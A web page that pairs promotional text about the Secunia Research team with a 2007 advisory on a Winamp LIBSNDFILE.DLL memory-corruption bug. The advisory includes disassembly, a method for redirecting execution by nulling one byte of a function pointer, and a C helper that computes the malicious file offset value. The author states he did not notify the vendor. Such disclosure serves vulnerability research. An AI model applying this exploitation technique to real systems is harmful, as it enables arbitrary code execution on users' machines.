How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

AOL Nullsoft Winamp LIBSNDFILE.DLL Remote Memory Corruption (Off By Zero)
by Piotr Bania
http://www.piotrbania.com
Severity: Critical - Possible remote code execution.
Software affected: Tested on AOL Nullsoft Winamp v5.33 (x86) Feb 13 2007
(on Windows XP SP1/SP2).
There exist a large possiblity that any other
software that is using the LIBSNDFILE.DLL component
should be considered as vulnerable.

I. BACKGROUND
AOL Nullsoft is the most popular multimedia player in the world.
Libsndfile.dll is a one of Winamp components.
II. DESCRIPTION
The problem takes place when Winamp is trying to play specially
crafted .MAT (MATLAB SOUND FILE).
Take a look a this code snipet:
----// SNIP SNIP //-------------------------------------------------
.text:1000CCED cmp [ebp+MY\_DWORD], 40h ; (1)

.text:1000CD00 push eax
.text:1000CD01 push ebx ; int
.text:1000CD02 push esi ; DistanceToMoveHigh
.text:1000CD03 call sub\_10025A28
.text:1000CD08 mov eax, [ebp+MY\_DWORD]
.text:1000CD0B mov byte ptr [ebp+eax+var\_64], 0 ; (2)
----// SNIP SNIP //-------------------------------------------------
Here, MY\_DWORD value is completly controled by the attacker and it is stored at
offset 0x39 from begining of the attached .mat files.
As you can see, the block (1) is very important since, the memory overwrite
will not occur when MY\_DWORD value will be greater or equal to 0x40.
The way of computing memory address at block (2), leads as to following basic
math assumptions:
1) x < 0x40
2) y = ebp + x - 0x64
Where:
x - our param (MY\_DWORD)
y - final overwrite address
Then after few simple calculations, we should have got a dimension for \*y\*
(final address), since the \*x\* dimension is limited by 0x40.
So here we have:
\*\* y < ebp - 0x64 + 0x40 \*\*
that means for example, if we consider EBP is equal to 0x010CFB7C, we got:
\*\* y < 0x10CFB58 \*\*
It shortly means that the final address that we can compute from our
MY\_DWORD value, must be lower then 0x10CFB58. That surely make the exploitaiton
harder since we are limited to the memory lower then 0x10CFB58. If we consider
only the modules, which are loaded together with the target process we should
have some that suits our needs:

----// SNIP SNIP //-------------------------------------------------
As you can see we have some modules which are available for our needs (mainly
they are mapped below the limits we have). As you probably know, we can only
overwrite a single byte with a single NULL byte.
For a little EIP redirection example of mine, lets consider following
sitatution. Here, we have pretty interresting datas from WINAMP.EXE:
(DATA section stays writeable)
----// SNIP SNIP //-------------------------------------------------
...
.data:00472F14 ; sub\_456A06+Bo ...
.data:00472F18 ; \_\_int32 off\_472F18
.data:00472F18 off\_472F18 dd offset sub\_456566 ; DATA XREF: sub\_40340C+58r
.data:00472F18 ; sub\_4543E8+59r ...
.data:00472F1C ; \_\_int32 off\_472F1C
.data:00472F1C off\_472F1C dd offset sub\_4565D5 ; DATA XREF: sub\_406220+49r
.data:00472F1C ; sub\_406587+BEr ...
.data:00472F20 ; \_\_int32 off\_472F20
.data:00472F20 off\_472F20 dd offset sub\_45668E ; DATA XREF: sub\_4097F4+B1r
.data:00472F20 ; sub\_45668E+Bo ...
...
----// SNIP SNIP //-------------------------------------------------
The off\_472F1C is infact:
----// SNIP SNIP //-------------------------------------------------
00472F1C A0 AD 80 7C  ­|
----// SNIP SNIP //-------------------------------------------------
which is a pointer to KERNEL32.DLL!GetProcAddress API function.
In this case (consider we want to overwrite this data entry) we can
make the following redirections:
1) 7C80ADA0 -> 0080ADA0
2) 7C80ADA0 -> 7C00ADA0
3) 7C80ADA0 -> 7C8000A0
4) 7C80ADA0 -> 7C80AD00
That means, that when WINAMP.EXE will try to call the GetProcAddress
function ((from the pointer it has), it will fly to the address we have
modified:
To see the example run EIP\_FLOW.mat, and monitor all the EDI values
at 0x00425127.
----// SNIP SNIP //-------------------------------------------------
.text:004250E8 mov edi, off\_472F1C ; <-- OUR MODIFIED OFFSET
...
.text:00425127 call edi ; <-- EXECUTION
----// SNIP SNIP //-------------------------------------------------
In this example you should be redirected to 0x7C00ADA0.
\*\* Access violation when executing [7C00ADA0] \*\*
Of course there exist also another possiblity, where attacker can modify
the stack space directly (since the stack here is correct for our limits),
Of course i not mean here the stack of LIBSNDFILE module, because it not suits
our needs (0x010CFFFC is too much).
There are probably much more importants areas there. Attacker should
choose the best way.
III. POC CODES
If you didnt see the correct result of eip\_flow.mat, you may need to recalculate
the address at offset 0x39, with your value of EBP register. You can grab it
while launching poc.mat.
Here's a little proggy for computing X value (the one at 0x39 offset):
----// SNIP SNIP //-------------------------------------------------
#include
#include
/\* modify this for your own EBP \*/
unsigned long ebp = 0x010CFB7C;
#define give\_addr(x) (unsigned long)(x - ebp + 0x64)
long ConvertHexStrToLong( char\* s );
int main(int argc,char \*argv[])
{
unsigned long out = give\_addr(ConvertHexStrToLong(argv[1]));
printf("[\*] X is: 0x%.08x\n",out);
if (((signed)out>= 0x40))
printf("[\*] WARNING THE X VALUE IS NOT VALID (COLLIDING LIMITS)\n");
else
printf("[\*] X VALUE IS OK!!!\n");
return 0;
}
long ConvertHexStrToLong( char\* s )
{
int hexDigit[] = { 10, 11, 12, 13, 14, 15 };
long n = 0;
char c = \*s++;
while( c != '\0' )
{
if( c >= '0' && c <= '9' )
n = n \* 16 + (c - '0');
else
{
c = tolower( c );
n = n \* 16 + hexDigit[(c - 'a')];
}
c = \*s++;
}
return n;
}
----// SNIP SNIP //-------------------------------------------------
EXAMPLE (we want to overwrite 0x472F1C):
(19:51:pb@wisdom)~:> ./sru 0x472F1C
[\*] X is: 0xff3a3404 <--- this value should be put at 0x39
[\*] X VALUE IS OK!!!
III. IMPACT
Successful exploitation may allow the attacker to run arbitrary code in
context of user running AOL Nullsoft Winamp.
IV. VENDOR RESPONSE
Due to the fact i was looking for a AOL NULLSOFT contact for over 30 minutes with
no effect, i got finally bored and i haven't notified them at all.
